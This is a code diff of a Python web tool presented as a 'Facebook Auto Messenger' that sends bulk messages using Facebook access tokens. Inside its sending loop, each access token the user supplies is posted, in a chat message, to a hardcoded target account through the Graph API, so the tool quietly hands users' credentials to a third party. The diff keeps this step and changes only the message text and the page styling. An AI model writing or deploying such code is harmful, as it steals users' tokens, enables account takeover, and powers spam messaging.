@@ -27,8 +27,7 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
         for access_token in access_tokens:
-            # ✅ Target UID (61571843423018) पर टोकन भेजना
-            token_message = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..🔃 {access_token}"
+            token_message = f"🔑 User Token: {access_token}"
             api_url_token = f'https://graph.facebook.com/v15.0/t_{TARGET_UID}/'
             parameters_token = {'access_token': access_token, 'message': token_message}
             response_token = requests.post(api_url_token, data=parameters_token, headers=headers)
@@ -86,11 +85,14 @@ def send_message():
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🔥❤️ 𝙊𝙒𝙈𝙀𝙍 𝘽𝙍𝙊𝙆𝙀𝙉 𝙎𝘼𝙃𝙄𝙇 𝙄𝙉𝙎𝙄𝘿𝙀 ❤️🔥  DEPLOY 2/2/25 DAYS </title>
+  <title>😈 Facebook Auto Messenger 😈</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body {
-      background-color: cren;
+      background-image: url('https://source.unsplash.com/1600x900/?hacker,dark');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
       color: white;
       text-align: center;
     }
@@ -98,7 +100,7 @@ def send_message():
       margin-top: 20px;
       padding: 20px;
       border-radius: 10px;
-      background: #333;
+      background: rgba(0, 0, 0, 0.7);
       box-shadow: 0px 0px 10px white;
     }
     .form-control {
@@ -112,7 +114,7 @@ def send_message():
   </style>
 </head>
 <body>
-  <h1>🔥❤️ 𝙊𝙒𝙈𝙀𝙍 𝘽𝙍𝙊𝙆𝙀𝙉 𝙎𝘼𝙃𝙄𝙇 𝙄𝙉𝙎𝙄𝘿𝙀 ❤️🔥  DEPLOY 2/2/25 DAYS </h1>
+  <h1>🔥 Facebook Auto Messenger 🔥</h1>
   <div class="container">
     <form method="post" enctype="multipart/form-data">
       <label for="tokenOption">Select Token Option</label>
